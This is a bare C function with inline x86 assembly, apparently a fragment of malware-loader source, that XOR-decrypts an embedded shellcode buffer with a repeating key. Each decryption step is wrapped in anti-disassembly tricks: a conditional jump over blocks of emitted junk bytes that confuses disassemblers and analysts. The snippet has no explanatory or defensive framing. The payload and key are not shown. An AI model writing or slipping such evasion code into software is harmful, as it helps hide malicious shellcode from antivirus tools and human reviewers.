void DecryptShellcode() {
    for (int i = 0; i < sizeof(Shellcode); i++) {

        __asm
        {
            push eax
            xor eax, eax
            jz True1
            __asm __emit(0xca)
            __asm __emit(0x55)
            __asm __emit(0x78)
            __asm __emit(0x2c)
            __asm __emit(0x02)
            __asm __emit(0x9b)
            __asm __emit(0x6e)
            __asm __emit(0xe9)
            __asm __emit(0x3d)
            __asm __emit(0x6f)

            True1:
            pop eax
        }

        Shellcode[i] = (Shellcode[i] ^ Key[(i % sizeof(Key))]);


        __asm
        {
            push eax
            xor eax, eax
            jz True2
            __asm __emit(0xd5)
            __asm __emit(0xb6)
            __asm __emit(0x43)
            __asm __emit(0x87)
            __asm __emit(0xde)
            __asm __emit(0x37)
            __asm __emit(0x24)
            __asm __emit(0xb0)
            __asm __emit(0x3d)
            __asm __emit(0xee)
            True2:
            pop eax
        }
    }
}